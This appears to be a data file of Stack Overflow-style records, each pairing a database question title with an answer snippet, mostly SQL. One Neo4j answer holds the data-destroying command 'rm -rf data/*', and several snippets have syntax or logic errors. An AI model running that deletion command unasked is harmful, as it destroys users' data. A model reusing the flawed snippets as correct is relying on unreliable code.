   where date_booked = '$date'
  )
"
9945,56042,SAS how to get random selection by group randomly split into multiple groups,"/* create dummy dataset */
data have;
do customerid = 1 to 10000;
length group other_variable $8;
if rand('uniform')<0.5 then group = 'blue'; /* assign blue or green with equal likelihood */
    else group = 'green';
other_variable = byte(97+(floor((1+122-97)*rand('uniform')))); /* random letter between a and z */
output;
end;
run;

/* dataset must be sorted by group variable */
proc sort data=have;
by group;
run;

/* extract random sample of 4000 from each group */
proc surveyselect data=have
                    out=want
                    n=4000
                    seed=12345; /* specify seed to enable results to be reproduced */
strata group; /* set grouping variable */
run;

/* assign a new subgroup for every 2000 rows */
data want;
set want;
sub=int((_n_-1)/2000)+1;
run;
"
18842,62552,Optimize MySQL Query on Multiple NOT INs,"SELECT  a.*
FROM    item a
        LEFT JOIN itemLock b
            ON a.ID = b.ID
        LEFT JOIN itemLog c
            ON a.ID = c.ID
WHERE   b.ID IS NULL AND 
        c.ID IS NULL
"
25643,68678,Getting ids which belongs to a particular category and also does not belong to another category,"select t.id, x.category 
from tablename x 
left join (
select distinct id from tablename where category <> 'b'
except
select distinct id from tablename where category = 'b') t
on x.id = t.id
"
32261,3103,Sync values between two tables,"MERGE INTO painting_qc_hist dst
USING (SELECT surface, head_mark FROM master_drawing_assigned) src
ON (dst.head_mark = src.head_mark)
WHEN MATCHED THEN UPDATE SET dst.current_qc_surface = src.surface;
"
23803,23252,T-SQL - Find differences for PK's in a single table (self join?),"DECLARE @thisCar varchar(20) 
DECLARE @thatCar varchar(20) 

SET @thisCar = 'Car1'
SET @thatCar = 'Car2'


SELECT * FROM
(
    SELECT @thisCar AS Parent, Component FROM products WHERE parent = @thisCar
    EXCEPT
    SELECT @thisCar AS Parent, Component FROM products WHERE parent = @thatCar
) c1
UNION ALL
SELECT * FROM
(
    SELECT @thatCar AS Parent, Component FROM products WHERE parent = @thatCar
    EXCEPT
    SELECT @thatCar AS Parent, Component FROM products WHERE parent = @thisCar
    ) c2
"
7616,40943,Insert data into an varray of refs,"INSERT INTO selecoes (pais, continente, tecnico, jogadores)
VALUES ('Brasil', 'America do Sul',
    (SELECT REF(e) FROM tecnicos e WHERE e.nacionalidade = 'Brasil'),
    (SELECT CAST(COLLECT(REF(j)) AS tListaJogadores) FROM jogadores j WHERE j.nacionalidade = 'Brasil')
);
"
5936,66221,Group By with Window Function instead of two Window Functions,"SELECT *
FROM 
(
  select info.*,
    time - lag(time) over (partition by id order by time) as diff_time
  from info
) auxiliary_table_with_lag_diffs
WHERE diff_time > interval '1 hour';
ORDER BY id, time;
"
38717,71733,Creating SQL Query involving two tables where one table is required only for a single value,"SELECT clients.*, count(bids.id) as bids
FROM clients
  LEFT JOIN bids ON bids.client_id = clients.id 
  GROUP BY clients.id;
"
136,53734,Oracle - junction tables and connect to prior,"select parent_task.* 
    from (
    select  parent_task_id, item_id, task_id, level
        from (
            select 
                task.task_id parent_task_id, 
                task_item.item_id, 
                item.task_id task_id
            from 
                task, task_item, item
            where 
                task_item.task_id = task.task_id
            and 
                item.item_id = task_item.item_id) properly_structured_parent_table    
        start with task_id = :TASK_ID
        connect by prior parent_task_id = task_id 
    ) task_hierarchy, task parent_task
where parent_task.task_id = task_hierarchy.task_id;
"
29268,16635,trigger in sql server 2008,"create trigger updatePopulation
on career_tb
-- to update sum even if carreer gets deleted or inserted
after insert, update, delete
as
-- to avoid trigger messing up rows affected
   set nocount on

   if UPDATE(carrerPopulation)
   begin
    -- update sum by difference between previous and current state of one record in career
      update school_tb
         set schoolPopulation = schoolPopulation + difference
        from school_tb
      -- derived table sums all the careers changed in one go
         inner join
         (
         -- sum all values from careers by school
             select idSchool, sum (carrerPopulation) difference
             from
             (
              -- change sign of previous values
                 select deleted.idSchool, -deleted.carrerPopulation carrerPopulation
                   from deleted
                 union all
              -- + current values
                 select inserted.idSchool, inserted.carrerPopulation
                   from inserted
              ) a
              group by idSchool
            -- Skip update in case of no change
              having sum (carrerPopulation) <> 0
         ) a
           on school_tb.idSchool = a.idSchool
    end
"
5739,66390,Firebird howto count all record in table and sort max to min,"select customer, count(*) as freq
from table_1
group by customer
order by 2 desc, 1
limit 10
"
37009,23359,How to delete/create databases in Neo4j?,"rm -rf data/*
"
11143,61886,Retrieving only one record for each entity in a SQL table,"SELECT   a.ID AS 'DealID',
         a.TradeDate,
         c.COMPANYNAME AS 'Seller Company',
         a.SellCommission,
         h.BROKER_FULLNAME AS 'Seller Trader',
         j.DisplayName AS 'Seller Broker',
         d.COMPANYNAME AS 'Buyer Company',
         a.BuyCommission,
         g.BROKER_FULLNAME AS 'Buyer Trader',
         i.DisplayName AS 'Buyer Broker',
         e.PRODUCT_NAME,
         f.TYPE_DESC AS 'Quantity Type',
         f.NBR_OF_GALLONS AS 'Quantity Multiplier',
         a.ContractVolume,
         a.TotalVolume,
         a.DeliveryPoint,
         a.Price,
         a.ContractStart,
         a.ContractEnd
FROM Confirmations AS a WITH (NOLOCK)
         LEFT OUTER JOIN COMPANY AS c WITH (NOLOCK) ON c.COMPANY_ID = a.SellCompany
         LEFT OUTER JOIN COMPANY AS d WITH (NOLOCK) ON d.COMPANY_ID = a.BuyCompany
         LEFT OUTER JOIN BIOPRODUCTTYPES AS e WITH (NOLOCK) ON e.ID = a.ProductID
         LEFT OUTER JOIN BIO_QUANTITY_TYPE AS f WITH (NOLOCK) ON f.ID = a.QuantityTypeID
         LEFT OUTER JOIN COMPANYBROKER AS g WITH (NOLOCK) ON g.COMPANYBROKER_ID = a.BuyTrader
         LEFT OUTER JOIN COMPANYBROKER AS h WITH (NOLOCK) ON h.COMPANYBROKER_ID = a.SellTrader
         LEFT OUTER JOIN Users AS i WITH (NOLOCK) ON i.ID = a.BuyBroker
         LEFT OUTER JOIN Users AS j WITH (NOLOCK) ON j.ID = a.SellBroker
WHERE    a.ID in 
         (
            Select max(ID) 
            from Confirmations (NOLOCK)
            Where TradeDate >= '2011-04-01 00:00:00' AND TradeDate <= '2013-10-25 00:00:00'
            Group by SellTrader
        )
ORDER BY a.TradeDate;
"
3612,70393,SQL: Insert Data from another database if they don't already exist,"insert DatabaseB.Users
select name, age,salary
from DatabaseA.Users a
where not exists (select 1 from DatabaseB.Users b where b.name = a.name)
"
1026,55782,Suggest appropriate mysql date function,"SELECT DATE('2013-01-10 05:10:50') <= CURDATE() FROM DUAL;

SELECT '2013-01-10 05:10:50' <= DATE_FORMAT(NOW(), '%Y-%m-%d 23:59:59') FROM DUAL;
"
20874,41895,SQL Query to split 1 value into 3 rows,"create table test(cola varchar(10),colb varchar(10),colc varchar(10))

insert into test select 'a','b','123'


    ;WITH CTE AS(
    select cola,colb,LEFT(colc,1) colc,RIGHT(colc,len(colc)-1) as rem from test
    union all
    select cola,colb,LEFT(rem,1) colc,RIGHT(rem,len(rem)-1) as rem from CTE
    where LEN(rem) >= 1
    )
    select cola,colb,colc from CTE
"
34547,60372,Oracle Grant privileges,"grant all
   on customer
   to some_user
 with grant option;
"
8601,72318,How to restrict the length of INTEGER when creating a table in SQL Server?,"create table some_table
(
   phone_number integer not null check (phone_number between 0 and 9999999999)
);
"
25196,48399,how to get avg time in postgresql,"postgres=# SELECT *, total_time / number AS avg_time 
    FROM (SELECT INTERVAL '00:02:28' AS total_time, 10 AS number) a;
 total_time | number |  avg_time  
------------+--------+------------
 00:02:28   |     10 | 00:00:14.8
(1 row)
"
17187,53372,Join query on Wordpress usermeta,"SELECT meta.umeta_id as umeta_id, meta.user_id as user_id, meta.meta_value as ourID, country.meta_value as country
FROM usermeta as meta
INNER JOIN usermeta as country ON meta.user_id = country.user_id
WHERE meta.meta_key = 'ourID' 
AND country.meta_key = 'country'
"
23436,53132,How to provision Oracle-to-MySQL replication using synchronous CDC with no downtime?,"SQL> COL scn FORMAT 999999999999999
SQL> SELECT MIN(created_scn) scn FROM change_tables WHERE change_set_name = 'TUNGSTEN_CS_{service_name}';
"
11902,9648,How to cleanup the utplsql testpackages?,"<plugin>
  <groupId>org.codehaus.mojo</groupId>
  <artifactId>sql-maven-plugin</artifactId>

  <executions>
    <execution>
      <id>default-cli</id>
      <phase>test</phase>
      <goals><goal>execute</goal></goals>
      <configuration>
        <sqlCommand>DROP PACKAGE UT_PACKAGENAMEUNDERTEST</sqlCommand>
      </configuration>                
    </execution>
  </executions>
</plugin>
"
5193,23476,Merge 2 Stored procedures columns similar to joining,"create proc merged_procs as

create table #t1 (month, amount)
create table #t2 (month, amount)

insert into #t1 exec sp1
insert into #t2 exec sp2

select
    t1.month,
    t1.amount amount1,
    t2.amount amount2
from
    #t1 t1
        inner join
    #t2 t2
        on t1.month = t2.month
order by
    t1.month
"
16754,30690,A selection with the lowest id,"SELECT 
    oe.id AS oeID, oh.ordernumber, oe.order_line, oe.prod_week, 
    oe.prodplan_id, oe.door_type, oe.amount AS amountOfDoors, oe.inner_color, 
    oe.outer_color, oe.prod_week, a.name, a.description, i.amount AS iAmount, 
    md.status AS mdStatus, i.width, i.length, c.color_name AS innerColor, 
    c2.color_name AS outerColor, pp.status, oe.pos, d.name, md.id AS mdid 
FROM pd_mounting_details AS md 
LEFT OUTER JOIN pd_order_eco AS oe ON md.order_data = oe.id 
LEFT OUTER JOIN pd_article AS a ON md.article = a.id 
LEFT OUTER JOIN pd_inventory AS i ON md.id = i.pp_id 
LEFT OUTER JOIN pd_order_head AS oh ON oe.order_head = oh.id 
LEFT OUTER JOIN pd_colors AS c ON oe.inner_color = c.id 
LEFT OUTER JOIN pd_colors AS c2 ON oe.outer_color = c2.id 
LEFT OUTER JOIN pd_doors as d ON oe.door=d.id 
LEFT OUTER JOIN pd_production_plan AS pp ON oe.prodplan_id = pp.id 
WHERE 
     (a.production_group = 4) 
     AND (NOT (oe.amount = 0)) 
     AND (pp.status = 4) 
     AND md.status = 4
     AND (startTime = '' OR startTime IS NULL) 
     AND (stopTime = '' OR stopTime IS NULL)

     --ADDED
     AND oe.prodplan_id = (SELECT MIN(prodplan_id) FROM pd_order_eco)

ORDER BY oe.pos
"
10783,70842,Grouping items into first occurances,"var result = data.OrderBy(x => x.SessionStarted)
    .GroupBy(x => x.IPAddress)
    .Select(x => x.First())
    .GroupBy(x => x.SessionStarted.Date)
    .Select(x => new { Date = x.Key, New = x.Count() });
"
35306,71738,How do I execute this query in MYSQL?,"SELECT word, COUNT(*) word_cnt
FROM your_table
GROUP BY word
ORDER BY COUNT(*) DESC
LIMIT 10
"
21699,65870,SQL Selection of products in a single category,"WHERE  category.parentID = <cfqueryparam value=""#catID#"" cfsqltype=""cf_sql_varchar""/>
       AND product.name <> """"
GROUP BY
       product.productID
ORDER BY
       RAND() 
LIMIT  8
"
9787,48710,Set Order By Clause Dynamically for Procedure based data block," select ... from ...
 order by decode(:val, 1, col1, 2, col2)
"
35586,57540,How can I construct an sql query for the following result?,"select ifnull(id_2, id_1) id, 
       ifnull(val1_2, val1_1) val1, 
       ifnull(val2_2, val2_1) val2 
from (  
       select t1.id id_1, t1.val1 val1_1, t1.val2 val2_1, 
              t2.id id_2, t2.val1 val1_2, t2.val2 val2_2
       from table1 t1 left join table2 t2 on t1.id = t2.id 
       union
       select * from table1 t1 right join table2 t2 on t1.id = t2.id 
) x
"
25431,40709,Complex MySql Query is giving incorrect results,"select * from (
    select a.idArticle, a.content, max(`order`) max_order
    from words_learned wl
    join words w on w.idwords = wl.idwords
    join article a on a.idArticle = w.idArticle
    where wl.userId = 4
    group by a.idArticle
) a
left join (
    select count(*) unknown_count, w2.idArticle from words w2
    left join words_learned wl2 on wl2.idwords = w2.idwords
    and wl2.userId =  4
    where wl2.idwords is null
    group by w2.idArticle
) unknown_counts on unknown_counts.idArticle = a.idArticle
where unknown_count is null or unknown_count < 10
order by max_order desc
limit 100
"
29627,7777,Update query based on date range,"Update T1
Set 
t1.id= T2.id,
t1.col2 = case when t1.dob < '1986-12-31' then t1.col2 else t2.col2 end,
t1.col3 = case when t1.dob > '1986-12-31' then t1.col3 else t2.col3 end
--More columns in the same way
from Table1 T1
Inner Join Table2 T2
ON T1.Cid = T2.cid
and T1.Name = T2.Name
and T1.DOB = T2.DOB
"
28168,47584,Where/How are Oracle Column Aliases Declared?,"CREATE VIEW myView (alias1, alias2) as select ixtbm, ixkit from f3002_wh;
"
29770,59739,MYSQL Query for getting non null coloumn names,"select `user`,
       ws_concat(',',
                 (case when p1 is not null then 'p1' else '' end),
                 (case when p2 is not null then 'p2' else '' end),
                 (case when p3 is not null then 'p3' else '' end),
                 (case when p4 is not null then 'p4' else '' end)
                ) as NonNullColumns
from t
where `user` = 'ravi';
"
13231,74244,How to search multiple columns with one variable,"WHERE sLastName  LIKE N'%' + @search + '%'
   OR sFirstName LIKE N'%' + @search + '%'
   OR sBarCode   LIKE N'%' + @search + '%';
"
17177,787,Treat column as different type for sorting,"select name from tbl order by cast(stringColumn as float)
"
12619,29259,sql query display maximum value or all values per customer,"CREATE VIEW CustFavorDirector AS

with CustDirectorRentals as (
    SELECT CustTakenFilms.CustomerID ,CustTakenFilms.[Customer Name],
    ActorDirector.ParticipantID, ActorDirector.[Participant Name],                   COUNT(ActorDirector.ParticipantID) 'Times was taken' 
    FROM 
    (
    SELECT
    Cust.CustomerID,
    Cust.FirstName + ' ' + Cust.LastName AS 'Customer Name' ,
    Fil.FilmID, Fil.FilmName
    FROM
    FilmLibrary.dbo.Customer AS Cust
    INNER JOIN
    FilmLibrary.dbo.Rental AS Rent
    ON
    Cust.CustomerID = Rent.CustomerID
    INNER JOIN
    FilmLibrary.dbo.RentalDetails AS RentDet
    ON
    Rent.RentalID = RentDet.RentalID
    INNER JOIN
    FilmLibrary.dbo.FilmCopy AS FilCop
    ON
    RentDet.FilmCopyID = FilCop.FilmCopyID
    INNER JOIN
    FilmLibrary.dbo.Film AS Fil
    ON
    FilCop.FilmID = Fil.FilmID
    ) AS CustTakenFilms
    INNER JOIN
    (
    SELECT Film.FilmID, Film.FilmName,Part.ParticipantID , Part.FirstName + ' ' +      Part.LastName AS 'Participant Name', Rol.RoleTypeName
    FROM 
    FilmLibrary.dbo.Film AS Film
    INNER JOIN
    FilmLibrary.dbo.FilmDetails AS FilDet
    ON
    Film.FilmID = FilDet.FilmID
    INNER JOIN
    FilmLibrary.dbo.Participant AS Part
    ON
    FilDet.ParticipantID = Part.ParticipantID
    INNER JOIN 
    FilmLibrary.dbo.RoleType AS Rol
    ON
    FilDet.RoleTypeID = Rol.RoleTypeID
    WHERE Rol.RoleTypeName IN ('Director')
    ) AS ActorDirector
    ON
    CustTakenFilms.FilmID = ActorDirector.FilmID
    GROUP BY CustTakenFilms.CustomerID , CustTakenFilms.[Customer Name],
    ActorDirector.ParticipantID, ActorDirector.[Participant Name]
)
, CustMaxRentals AS (
    SELECT  CustomerID, max([Times was taken]) AS MaxTimesTaken
    FROM    CustDirectorRentals
)
SELECT  cdr.*
FROM    CustDirectorRentals cdr
        JOIN CustMaxRentals cmr ON cdr.CutomerId = cmr.CustomerId AND cdr.[Times was taken] = cmr.MaxTimesTaken;
"
38532,71287,join if entry doesn't exists in second table,"SELECT ... FROM Table1 LEFT JOIN Table2 On Table1.FK = Table2.PK
"
4324,30730,Designing database,"Select rec.rec_id, 
       Count(itn.item_id) as [NumMatches]
From recipe as rec
Join items_needed as itn on itn.rec_id = rec.rec_id
Where itn.item_id in (comma-delimited-list-of-itemIDs)
Group By rec.rec_ID
Having Count(itn.item_id) > 0
Order By Count(itn.item_id) desc
"
24755,16797,General method to create INSERT scripts for any given table," CREATE procedure [dbo].[GenerateInsert]
 @TableName varchar(50),
 @ShouldGenerateScriptForIdInFirstColumn INT
 as
 Begin

      -- Utility stored Procedure 
      -- Returns the list with inserts (re-create the table with all the data)

      print '-- Swoosh 2004'
      if (@ShouldGenerateScriptForIdInFirstColumn = 1)
      begin
                print ''
                print 'SET IDENTITY_INSERT ' + @TableName + ' ON'
                print 'GO'
                print ''
      end

      declare @strSQL varchar(8000)
      declare @ColumnList varchar(8000)
      declare @ColumnListInOne varchar(8000)
      declare @ColumnName varchar(8000)
      declare @ColumnType int, @myCounter int, @shouldDo int
      declare @ID as integer

      select @ID = id from sysobjects where type = 'U' and name = @TableName
      set @ColumnList = ''
      set @ColumnListInOne = ''
      set @myCounter = 0

      declare ccursor cursor for
                select          Name, Xtype
                from          syscolumns
                where          id = @ID

      open ccursor
      fetch next from ccursor into @ColumnName, @ColumnType
      while @@FETCH_STATUS = 0
      begin
                IF (@ShouldGenerateScriptForIdInFirstColumn = 1)
                BEGIN
                          SET @shouldDo = 1
                END
                ELSE
                BEGIN
                          IF (@myCounter = 0)
                          BEGIN
                                    SET @shouldDo = 0
                          END
                          ELSE
                          BEGIN
                                    SET @shouldDo = 1
                          END
                END

                if (@shouldDo = 1)
                begin
                          Select @ColumnList = @ColumnList + @ColumnName + ', '

                          if (@ColumnType = (select xtype from systypes where name = 'int')) or (@ColumnType = (select xtype from systypes where name = 'float')) or (@ColumnType = (select xtype from systypes where name = 'decimal')) or (@ColumnType = (select xtype from systypes where name = 'bit'))
                          begin
                                    Select @ColumnListInOne = @ColumnListInOne
                                    Select @ColumnListInOne = @ColumnListInOne + ' ltrim(rtrim(replace(isnull(convert(varchar(3000), ' + @ColumnName + '),''{|SWOOSH_NULL_REPLACER|}''),'''''''','''''''''''')))'
                          end
                          else
                          begin
                                    Select @ColumnListInOne = @ColumnListInOne + '''''''''' + ' + '
                                    Select @ColumnListInOne = @ColumnListInOne + ' ltrim(rtrim(replace(isnull(convert(varchar(3000), ' + @ColumnName + '),''''),'''''''','''''''''''')))'
                          end

                          if (@ColumnType = (select xtype from systypes where name = 'int')) or (@ColumnType = (select xtype from systypes where name = 'float')) or (@ColumnType = (select xtype from systypes where name = 'decimal')) or (@ColumnType = (select xtype from systypes where name = 'bit'))
                          begin
                                    Select @ColumnListInOne = @ColumnListInOne
                          end
                          else
                          begin
                                    Select @ColumnListInOne = @ColumnListInOne + ' + ' + ''''''''''
                          end

                          Select @ColumnListInOne = @ColumnListInOne + ' + '', '' + '
                end

                set @myCounter = @myCounter + 1
      fetch next from ccursor into @ColumnName, @ColumnType
      end --while @@FETCH_STATUS = 0
      close ccursor

      deallocate ccursor

      set @ColumnList = Left(@ColumnList,len(@ColumnList)-1)
      set @ColumnListInOne = Left(@ColumnListInOne,len(@ColumnListInOne)-9)

      set @strSQL = ''
      set @strSQL = @strSQL + ' declare @AllValues varchar(8000)'
      set @strSQL = @strSQL + ' set @AllValues  = '''''
      set @strSQL = @strSQL + ' declare ccursor cursor for '
      set @strSQL = @strSQL + '           select ' + @ColumnListInOne + ' from ' + @TableName
      set @strSQL = @strSQL + ' open ccursor '
      set @strSQL = @strSQL + ' fetch next from ccursor into @AllValues '
      set @strSQL = @strSQL + ' while @@FETCH_STATUS = 0 '
      set @strSQL = @strSQL + ' begin '
      set @strSQL = @strSQL + '          print ''insert into ' + @TableName + ' (' + @ColumnList + ') values ('' + replace(@AllValues, ''{|SWOOSH_NULL_REPLACER|}'', ''NULL'') + '')'' '
      set @strSQL = @strSQL + ' fetch next from ccursor into @AllValues '
      set @strSQL = @strSQL + ' end '
      set @strSQL = @strSQL + ' close ccursor '
      set @strSQL = @strSQL + ' deallocate ccursor '
      exec (@strSQL )

      if (@ShouldGenerateScriptForIdInFirstColumn = 1)
      begin
                print ''
                print 'SET IDENTITY_INSERT ' + @TableName + ' OFF'
                print 'GO'
      End
 End
"
32011,47057,orderby in sql query,"select
  foo,
  bar
from
  bortz
order by
  case foo 
    when 'E' then 1
    when 'C' then 2 
    when 'T' then 3 
    else 4 
  end
"
38837,37779,How to find the nearest date?,"select top 1 *
from CdCl
order by abs(datediff(ms, ReadTime, <yourdatetime>))
"
38081,45499,Oracle SQL find project with most hours logged multiple entries for hours,"SELECT p.pname, sum(wh.hours) as sum_hours
from projects p 
join workers_hours wh on p.pnum = wh.pnum
group by p.pname  
order by sum(wh.hours) desc
"
24652,23600,Rebuild materialized view log,"SELECT MASTER, LOG_TABLE, COLUMN_NAME 
FROM USER_MVIEW_LOGS
    JOIN USER_TAB_COLS c ON table_name = LOG_TABLE
WHERE MASTER = 'TABLE_WHERE_LOGS_ARE_TAKEN'
"
8457,35119,SQL order by 2 date fields,"SELECT * 
from table1 
ORDER BY IF(duedate = '0000-00-00 00:00:00', '9999-12-31', duedate),         
         datetime_added ASC,
         sequence DESC
"
29766,16696,Group By with count doesn't work,"SELECT projects.AgencyId,projects.ProgramId,count(projects.ProjStatusByMin) as status,
projects.ProjStatusByMin 
from projects 
where projects.AgencyId=40 
group by projects.ProjStatusByMin, projects.AgencyId,projects.ProgramId
"
33796,8533,SQL statement confusion,"SELECT productid
FROM   dbo.productgenre
WHERE  genreid IN ( 5, 6, 8 )
GROUP  BY productid
HAVING Count(DISTINCT genreid) = 3  
"
7977,47371,generate a list in sql,"SELECT g.nameOfGenre,
  COUNT(t.TrackId) AS tracks_count,
  COUNT(t.TrackId) / tt.total_tracks * 100 AS tracks_percent
FROM Genre g
  LEFT JOIN Track t ON t.GenreId = g.genreId
  JOIN (SELECT COUNT(*) AS total_tracks FROM Track) AS tt
GROUP BY g.genreId
"
16856,3184,Multiple SQL counts into single result set,"Select
(SELECT count(id) from ProductA_T where created between '<date>' and '<date>' and productstatus = ""<successful>"") as CountA
(SELECT count(id) from ProductB_T where created between '<date>' and '<date>' and productstatus = ""<successful>"") as CountB
(SELECT count(id) from ProductC_T where created between '<date>' and '<date>' and productstatus = ""<successful>"") as CountC
"
20687,58011,Trouble with sql columns,"SELECT Date,Sum(fValue) as FruitsValue,Sum(vValue) as VegtablesValue
FROM
(
SELECT Date,value as fValue,null as vValue FROM Fruits 
UNION ALL SELECT Date,null as fValue,Value as vValue  FROM Vegetables
) T
GROUP BY Date
"
25461,31731,How to find out if a user logged in every day in the last 10 days?,"SELECT user_id,
       COUNT( DISTINCT DATE( login_date )) AS days
FROM   Log_Table
WHERE  login_date > DATE_SUB( CURRENT_TIMESTAMP, INTERVAL 3 DAY )
GROUP BY user_id
HAVING days >= 3;
"
16855,25956,SQL constraint “at least one of two attributes”,"create table Users (
  /* Whatever */
  TelephoneNumber varchar(2000) null,
  EmailAddress varchar(5) null,
  constraint CK_AtLeastOneContact CHECK (
    TelephoneNumber is not null or
    EmailAddress is not null
  )
)
"
18357,45074,Simple SQL query..cannot get it resolved,"SELECT COUNT(*)
FROM Enemies
WHERE NOT EXISTS (SELECT * FROM Weapons WHERE Weapons.RedID=Enemies.ID)
"
36305,54365,SQL Subtract Column Values Based on Second Column Value with Group By Statement,"SELECT  FY_CD, 
        PD_NO, 
        'Variance' INPUT, 
        SUM(CASE WHEN Input = 'Actuals' THEN HOURS ELSE -1 * HOURS END) HOURS
FROM    LABOR_TABLE
GROUP   BY PD_NO
"
12829,50673,SQL Update  table field x where field y is z,"UPDATE Cities SET County_Id = 20 WHERE Cities.Code >= 10000 AND Cities.Code < 20000
"
15388,4827,sql server relationships between 3 tables,"CREATE TABLE UserInfo(
     Id int NOT NULL PRIMARY KEY IDENTITY
    ,FirstName varchar(15) NOT NULL
    ,LastName varchar(30) NOT NULL
    ,PhoneNumber varchar(10) NOT NULL
    ,EmailAddress varchar(30) NOT NULL
    ,AddressId int NOT NULL FOREIGN KEY REFERENCES [Address](Id)
);

CREATE TABLE Pets(
     Id int NOT NULL PRIMARY KEY IDENTITY
    ,UserInfoId int NOT NULL FOREIGN KEY REFERENCES UserInfo(Id)
    ,Name varchar(20)
    ,Breed varchar(35)
    ,[Weight] decimal (10,2) NOT NULL
    ,Cat bit NOT NULL
    ,Dog bit NOT NULL
);

CREATE TABLE Appointments(
     Id int NOT NULL PRIMARY KEY IDENTITY
    ,[Date] date NOT NULL
    ,UserInfoId int NOT NULL FOREIGN KEY REFERENCES UserInfo(Id)
);

CREATE TABLE AppointmentPets(
     AppointmentId int NOT NULL
    ,PetId int NOT NULL
    CONSTRAINT PK_AppointmentPets PRIMARY KEY(AppointmentId, PetId)
    );
"
9750,2783,Compare table to reference table and update value if specific fields are contained in reference table,"UPDATE A SET A.[isinB]=true
WHERE
B.[Firstname] Like ""*"" & A.[Firstname] & ""*"" AND B.[Lastname] Like ""*"" & B.[Lastname]
"
36362,35323,Percentile aggregate for SQL Server 2008 R2,"SELECT id,
       MIN(CASE WHEN seqnum >= 0.9 * cnt THEN x END) as percentile_90
FROM (select t.*,
             row_number() over (partition by id order by x) as seqnum,
             count(*) over (partition by id) as cnt
      from my_table t
     ) t
GROUP BY id
ORDER BY id;
"
11689,60796,PostgreSQL: reuse Column Data In Different Column Of The Same Query,"SELECT ""TreeRecord"".""Site"",
count(""TreeRecord"".*) AS Total_Count, 
round(avg(""TreeHistory"".""DBH""),0) AS Average_DBH,
count(case when ""TreeHistory"".""DBH"" > 10 then 1 end) as count_over_specific_size          
                                      ^^--change this size accordingly
FROM ""TreeRecord""
LEFT OUTER JOIN ""TreeHistory""
ON ""TreeRecord"".""ID"" = ""TreeHistory"".""TreeID""
GROUP BY ""Site""
ORDER BY ""Site"" ASC;
"
9609,25534,Use Partition By to return the MAX record from Join SQL,"WITH records
AS
(
    SELECT  ....,
            ROW_NUMBER() OVER (PARTITION BY CompanyIDticketID
                               ORDER BY stepCompanyStepOrder DESC) rn
    FROM    ....
)
SELECT  *
FROM    records
WHERE   rn = 1
"
22144,73768,SQL: Showing columns from 2 tables,"Select resource.id, resource.name, orders.markup from resource
inner join orders on orders.res_id = resource.id 
where orders.markup < 1000 and 
resource.id = 100
"
19971,34844,Aggregate and calculate total minutes for set of records as productivity,"SELECT NAME,
       COUNT(*) AS ""Records for NAME"",
       TO_CHAR(NUMTODSINTERVAL(SUM(END_DATE_TIME - START_DATE_TIME), 'DAY')) AS MINUTES
  FROM TABLE1
  GROUP BY NAME
"
15551,45100,Count records in each category,"SELECT c.cat_id, COUNT(a.album_id)
FROM ci_categories AS c
LEFT JOIN ci_albums AS a ON c.cat_id = a.cat_id
GROUP BY c.cat_id
"
27829,53880,"get first letter of string, disregarding ""the""","WHERE CASE WHEN SUBSTR(title, 1, 4) = 'the ' THEN SUBSTR(title, 5) ELSE title END LIKE '...'
"
5906,70563,Is there a way to search 2 or more fields at the same time?,"SELECT *
FROM (`tm_accounts`)
WHERE last_name LIKE '%o%' 
   or first_name LIKE '%o%';
"
13625,60186,Key in same table in postgres?,"create table nodes (
    id serial primary key,
    parentid integer references nodes(id),
    name varchar
);
"
2162,61981,group by column not having specific value,"SELECT DISTINCT Case_Id
FROM   [dbo].[caseRole] cr
WHERE  NOT EXISTS (SELECT *
                   FROM   [dbo].[caseRole] cr_inner
                   WHERE  cr_inner.Case_Id = cr.case_id 
                          AND cr_inner.RoleId = 4);
"
1877,13580,SQL query to get char from string based on criteria,"SELECT STUFF(
           @name,
           LEN(@name) - CHARINDEX('Y', REVERSE(@name)),
           LEN(@name),
           ''
       ) string
"
6222,42453,SQLite Order By Date,"SELECT * FROM Table ORDER BY date(dateColumn) DESC Limit 1
"
2969,31065,Display Dynamic EXECUTE Output Within pl/sql From sqlplus,"SQL> DEFINE scheme_name=SYS
SQL> DEFINE table_name=ALL_OBJECTS
SQL> DECLARE
  2     sql_query VARCHAR2(32767);
  3     l_cursor  NUMBER := dbms_sql.open_cursor;
  4     l_dummy NUMBER;
  5     l_columns dbms_sql.desc_tab;
  6     l_value NUMBER;
  7  BEGIN
  8     sql_query := 'select ';
  9     FOR column_rec IN (SELECT column_name
 10                          FROM ALL_TAB_COLS
 11                         WHERE owner = '&scheme_name'
 12                           AND table_name = '&table_name'
 13                           AND data_type = 'NUMBER') LOOP
 14        sql_query := sql_query || 'SUM(' || column_rec.column_name
 15                     || ') ""SUM(' || column_rec.column_name || ')"", ';
 16     END LOOP;
 17     sql_query := substr(sql_query, 0, length(sql_query) - 2)
 18                  || ' from &scheme_name' || '.&table_name';
 19     dbms_sql.parse(l_cursor, sql_query, dbms_sql.NATIVE);
 20     dbms_sql.describe_columns(l_cursor, l_dummy, l_columns);
 21     FOR i IN 1..l_columns.count LOOP
 22        dbms_sql.define_column(l_cursor, i, l_columns(i).col_type);
 23     END LOOP;
 24     l_dummy := dbms_sql.execute_and_fetch(l_cursor, TRUE);
 25     FOR i IN 1..l_columns.count LOOP
 26        dbms_sql.column_value(l_cursor, i, l_value);
 27        dbms_output.put_line(l_columns(i).col_name ||' = '||l_value);
 28     END LOOP;
 29  END;
 30  /

SUM(DATA_OBJECT_ID) = 260692975
SUM(OBJECT_ID) = 15242783244
"
9455,47560,Update multiple columns in a TABLE from another TABLE (Oracle),"MERGE
INTO   (
       SELECT  *
       FROM    users1
       WHERE   AUTHSOURCEID=100
       ) oldauth
USING  (
       SELECT  *
       FROM    users2
       WHERE   AUTHSOURCEID=200
       ) newauth
ON     oldauth.AUTHUSERNAME=newauth.AUTHUSERNAME
WHEN MATCHED THEN
UPDATE
SET    AUTHUNIQUENAME=newauth.AUTHUNIQUENAME,
       DESCRIPTION=newauth.DESCRIPTION,
       MAPPINGAUTHNAME=newauth.MAPPINGAUTHNAME
"
8697,55419,SQL Server Completion Percentage Category,"select category,
100 * 1.0 * sum(case when complete = 'yes' then 1 else 0 end)/count(*) as pct
from tablename 
group by category
"
34430,75426,Return JOIN results based on the highest value in a specific column in one of the tables,"SELECT      m.Id, m.Name, d.Link
FROM        movies as m
JOIN        movies_downloads as d ON m.id = d.movieId 
JOIN   (SELECT MovieId, max(Id) as maxId from movies_downloads GROUP BY MovieId) as d2
            ON d.movieId = d2.movieId AND d.Id = d2.MaxId
ORDER BY    m.id desc
LIMIT 10
"
8740,45484,"Calculate running total for each {country,city,year,month} group","with test(Country, City, Year, Month,amount) as
(
  select 'Spain', 'Madrid', 2014, 4, 1 from dual union all
  select 'Spain', 'Madrid', 2014, 5, 1 from dual union all
